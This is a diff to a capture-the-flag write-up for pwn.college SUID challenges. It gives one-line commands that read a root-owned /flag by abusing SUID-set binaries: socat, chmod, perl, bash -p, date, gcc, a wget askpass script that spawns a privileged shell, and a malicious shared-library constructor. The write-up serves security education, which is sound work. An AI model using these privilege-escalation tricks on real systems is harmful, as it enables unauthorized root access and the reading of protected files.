@@ -1,12 +1,13 @@
 # Fundamentals 
 
-Most of these challenges can be solved with one liners, thus I will showcase the solutions below. I will not go into much details, the program runs the given commands with `SUID`. The purpose is for players to understand how the commands work. To getter a better understanding of each command, run on command line `man func_name`, e.g. `man cat`.
+Most of these challenges can be solved with one liners, thus I will showcase the solutions below. I will not go into much details, the program runs the given commands with `SUID`. The purpose is for players to understand how the commands work. To getter a better understanding of each command, run on command line `man func_name`, e.g. `man cat`. Always run the given executable at `/challenge` to set the `sticky bit` to each command.
 
 <center>
     <h1>
-      	Commands to read the context of a file
+Commands to read the context of a file
     </h1> 
 </center>
+
 
 ### Level 1 - cat
 
@@ -64,9 +65,10 @@ $ ./babysuid_level5 2&>/dev/null && /usr/bin/head /flag
 
 <center>
     <h1>
-      	Editors  
+Editors  
     </h1> 
 </center>
+
 
 ### Level 6 - sort
 
@@ -94,9 +96,10 @@ $ nano /flag
 
 <center>
     <h1>
-      	Analyze the output of the commands 
+Analyze the output of the commands 
     </h1> 
 </center>
+
 
 ### Level 10 - rev
 
@@ -121,7 +124,7 @@ $ od -A n -t x1 /flag | awk '{$1=$1; print}' | sed 's/ //g' | xxd -r -p
 Let me explain the components:
 
 - `od -A n -t x1 /flag`: This command dumps the contents of `/flag` in hexadecimal format, one byte per line.
-- `awk '{$1=$1; print}'`: This command removes leading whitespaces that `od` might introduce in the output.
+- `awk '{$1=$1; print}'`: This command      	 removes leading whitespaces that `od` might introduce in the output.
 - `sed 's/ //g'`: This command removes any spaces between the hex bytes.
 - `xxd -r -p`: This command converts the resulting stream of hex bytes back into binary, then the binary is interpreted as ASCII characters.
 
@@ -187,9 +190,10 @@ $ split /flag && cat xaa
 
 <center>
     <h1>
-      	Archive formats
+Archive formats
     </h1> 
 </center>
+
 
 ### Level 17 - gzip
 
@@ -239,9 +243,10 @@ $ find /flag | cpio -o
 
 <center>
     <h1>
-      	Execute other commands to read flag
+Execute other commands to read flag
     </h1> 
 </center>
+
 
 ### Level 23 - genisoimage
 
@@ -281,9 +286,283 @@ $ make -s -C / -f /dev/null --eval="$(echo -e 'print_flag:\n\t@cat /flag\n') pri
 ### Level 27 - nice
 
 ```bash
+$ nice cat /flag
+```
+
+### Level 28 - timeout
+
+```bash
+$ timeout 69 cat /flag
+```
+
+### Level 29 - stdbuf
+
+```bash
+$ stdbuf -o 0 cat /flag
+```
+
+### Level 30 - setarch
+
+```bash
+$ setarch --uname-2.6 cat /flag
+```
+
+### Level 31 - watch
+
+```bash
+$ watch -x cat /flag
+```
+
+### Level 32 - socat
+
+```bash
+$ socat -u FILE:/flag -
+```
+
+The output will be really long, go up right after the command to get the flag.
+
+- `-u` ensures that `socat` operates in unidirectional mode.
+- `FILE:/flag` specifies that `socat` should read from the `/flag` file.
+- `-` at the end instructs `socat` to send the contents to standard output.
+
+<center>
+    <h1>
+Programming
+    </h1> 
+</center>
+
+Personally, I wouldn't categorize these challenges as "programming", but that's what the Dojo suggests.
+
+### Level 33 - whiptail
+
+```bash
+$ whiptail --textbox /flag 20 60
+```
+
+### Level 34 - awk
+
+```bash
+$ awk 'BEGIN { while (getline < "/flag") print }'
+```
+
+### Level 35 - sed
+
+```bash
+$ sed -n 'p' /flag
+```
+
+- `-n` suppresses automatic printing of pattern space.
+- `'p'` specifies the pattern to match, which effectively prints every line.
+- `/flag` is the file you want to read.
+
+### Level 36 - ed
+
+Open the file with `ed` editor and write `p` to print its content.
+
+```bash
+$ ed /flag
+56
+p
+```
+
+<center>
+    <h1>
+Permissions
+    </h1> 
+</center>
+
+### Level 37 - chown
+
+Change the ownership of `/flag` from `root` to `hacker` so we are able to read it.
+
+```bash
+$ chown hacker /flag && cat /flag
+```
+
+### Level 38 - chmod
+
+Change the files mod bits to `read` so we are able to read it.
+
+```bash
+$ chmod +r /flag && cat /flag
+```
+
+### Level 39 - cp
+
+```bash
+cp --backup --no-preserve=all /flag ./flag.txt && cat flag.txt
+```
+
+### Level 40 - mv
+
+This one was a bit tricky. First of all we run the program to set `SUID` to `/usr/bin/mv`. Then, we `mv` the `/usr/bin/cat` to `/usr/bin/mv`. After that, we run the program again to set the `SUID`, but now it sets the `sticky bit` to `cat` instead of `mv`.
+
+```bash
+$  mv /usr/bin/cat /usr/bin/mv && ./babysuid_level40 && mv /flag
+Welcome to ./babysuid_level40!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/mv.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
+pwn.college{IsS_qm6D7HBmDndCzMOq0jD5n7S.QXygTMsMDN3IzW}
+```
+
+<center>
+    <h1>
+Programming Languages
+    </h1> 
+</center>
+
+### Level 41 - perl
+
+After we enter the command, we need to press `enter` to get the flag.
+
+```bash
+$ LC_ALL=en_US.UTF-8 perl -pe 'BEGIN { open(FILE, "<", "/flag") or die "Cannot open file /flag: $!"; } print while <FILE>; close(FILE);' 
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LANGUAGE = (unset),
+        LC_ALL = "en_US.UTF-8",
+        LC_CTYPE = "C.UTF-8",
+        LANG = "en_US.UTF-8"
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+
+pwn.college{0ZaXAqqFTl-8p4w1F9eP3TcYcig.QXzgTMsMDN3IzW
+```
+
+### Level 42 - python
+
+We can simply do `python /flag` to get the flag as error.
+
+### Level 43 - ruby
+
+Same as before
+
+```bash
+$ ruby /flag
+/flag:1: syntax error, unexpected local variable or method, expecting '}'
+pwn.college{06kxXyrzYst2E0pz5a-46koeJJS.QX1gTMsMDN3IzW}
+```
+
+### Level 44 - bash
+
+From the `man` page of `bash`:
+
+>     If  the  shell is started with the effective user (group) id not equal to the real user (group) id, and the -p option is not supplied, no startup files are read, shell  functions  are  not  inherited  from  the  environment, the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, are ignored, and the effective user id is set to the real user id.  If the -p option is supplied at invocation, the startup behavior is the same, but  the  effective user id is not reset.
+
+```bash
+$ bash -pi
+```
+
+After that, we simply `cat /flag` to get the flag.
+
+<center>
+    <h1>
+Commands that weren't supposed to read files
+    </h1> 
+</center>
+
+### Level 45 - date
+
+```bash
+$ date -f /flag
+```
+
+### Level 46 - dmesg
+
+From the `man` page of `dmesg`:
+
+>     -F, --file file
+>            Read the syslog messages from the given file. Note that -F does not support messages in kmsg format.The old syslog format is supported only.
+
+```bash
+$ dmesg -F /flag
+```
+
+### Level 47 - wc
+
+From the `man` page of `wc`: 
+
+>--files0-from=F
+>        read  input  from  the files specified by NUL-terminated names in file F; If F is - then read names from standard
+>        input
+
+```bash
+$ wc --files0-from=/flag
+```
+
+### Level 48 - gcc
+
+From the `man` page of `gcc`:
+
+> -x language
+>            Specify explicitly the language for the following input files (rather than letting the compiler choose a default
+>            based on the file name suffix).  This option applies to all following input files until the next -x option.
+>            Possible values for language are:
+>
+> ​		c  c-header  cpp-output
+> ​		c++  c++-header  c++-system-header c++-user-header c++-cpp-output
+> ​		objective-c  objective-c-header  objective-c-cpp-output
+> ​		objective-c++ objective-c++-header objective-c++-cpp-output
+> ​		assembler  assembler-with-cpp
+> ​		ada
+> ​		d
+> ​		f77  f77-cpp-input f95  f95-cpp-input
+> ​		go
+> ​		brig
+
+```bash
+$ gcc -x c /flag 
+```
+
+### Level 49 - as
+
+From the `man` page of `as`: 
+
+> OPTIONS
+>        @file
+>            Read command-line options from file. 
+
+```bash
+$ as @/flag
+```
+
+### Level 50 - wget
+
+This was the most difficult task so far.
+
+```bash
+F=$(mktemp) && chmod +x $F && echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$F && wget --use-askpass=$F 0
+cat /flag
+```
+
+1. `F=$(mktemp)`: This creates a temporary file and assigns its path to the variable `$F`.
+2. `chmod +x $F`: This gives execute permissions to the temporary file.
+3. `echo -e ‘#!/bin/sh -p\n/bin/sh -p 1>&0’ > $F`: This writes a shell script to the temporary file. The script executes `/bin/sh` with elevated privileges and redirects its output to file descriptor 0, effectively allowing interactive shell access.
+4. `wget --use-askpass=$F 0`: This attempts to use the temporary file as an askpass program for `wget`.
+
+### Level 51 - ssh-keygen
+
+```bash
+gcc -shared -o w3t.so -fPIC w3t.c
 ```
 
 
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+__attribute__((constructor))
+void w3t() { sendfile(1,open("/flag",0),0,4096); } 
+```
 
 
 
